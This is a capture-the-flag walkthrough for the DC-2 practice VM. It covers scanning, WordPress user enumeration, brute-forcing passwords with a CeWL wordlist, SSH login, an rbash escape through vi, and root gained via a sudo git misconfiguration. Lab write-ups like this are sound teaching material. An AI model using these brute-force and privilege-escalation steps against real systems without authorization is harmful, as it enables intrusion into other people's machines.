# DC-2 Machine Walkthrough

**Credits:**

**Rejaul Islam**  
_Security enthusiast_

............................................

## Overview

DC-2 is a vulnerable virtual machine designed for penetration testing practice. This walkthrough covers the complete process from reconnaissance to gaining root access.

## Initial Reconnaissance

### Finding the Target IP

```bash
sudo netdiscover
```

**Result:**

```
192.168.0.131   08:00:27:5e:07:20      2     120  PCS Systemtechnik GmbH
```

### Port Scanning with Rustscan

```bash
rustscan -a 192.168.0.131
```

### Service Enumeration with Nmap

```bash
nmap -sC -sV -n -v -p 22,7744 192.168.0.131
```

**Result:**

```
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
7744/tcp open   ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey:
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
MAC Address: 08:00:27:5E:07:20 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website Enumeration

### Adding to Hosts File (if needed)

```
echo "192.168.0.131 dc-2" | sudo tee -a /etc/hosts
```

### WordPress User Enumeration

```
wpscan --url http://dc-2/ --enumerate u --api-token <YOUR_API_TOKEN>
```

**Note:** Add your api token here. Login into wpscan website and get the token
I found this username from this scan..
**Result:**

```
[+] admin
[+] jerry
[+] tom
```

Save the usernames to a file:

```
echo -e "admin\njerry\ntom" > users.txt

```

OR

```
nano file_name.txt
```

- then paste those username

### Creating Custom Wordlist

Since the usual wordlists won't work, we create a custom one using CeWL:

```
cewl http://dc-2 | tee custom_wordlist.txt
```

### Password Bruteforce Attack

```
wpscan --url http://dc-2 -U users.txt -P custom_wordlist.txt --api-token YOUR_API_TOKEN
```

**Note:** Make sure your username and password file into same directory otherwise this command not working, then you need to add your file path to run this command.
**Result:**

```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

## Gaining Access

Now you can login with ssh, but in this case just tom user can login with ssh first.

### SSH Connection

```
ssh -p 7744 tom@dc-2
```

Password: `parturient`

### Escaping Restricted Shell (rbash)

Upon login, you'll find yourself in a restricted bash shell. Here's how to escape:

1. **Using Vi to escape:**

```
vi
:set shell=/bin/bash
:shell
```

2. **Setting proper PATH:**

```
export PATH=$PATH:/bin:/usr/bin
```

### Reading User Flags

```
# Read tom's flag
cat /home/tom/flag3.txt

# Switch to jerry, now we can login with another user
su jerry
Password: adipiscing

# Read jerry's flag
cat /home/jerry/flag4.txt
```

Now we need to get the root access to get the final flag.

## Privilege Escalation

### Checking Sudo Permissions

```
sudo -l
```

### Exploiting Git Sudo Privileges

- Respose:

```
(root) NOPASSWD: /usr/bin/git
```

now we need to search with git into gtfobins website. Here multiple sudo try those one by one and see the response and monitoring this response.

Use this sodo to get the root access:

```
sudo git -p help config
!/bin/sh
```

Now we are in root shell

### Reading Final Flag

```
cd /root
cat final-flag.txt
```

THE FLAG -

```
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

## Key Learning Points

1. **Custom Wordlists**: Real-world scenarios often require custom wordlists tailored to the target
2. **Restricted Shell Escape**: Techniques to break out of rbash environments
3. **Sudo Privilege Escalation**: Exploiting misconfigured sudo permissions
4. **WordPress Security**: Importance of strong passwords and proper user enumeration protection

--- THE END ---
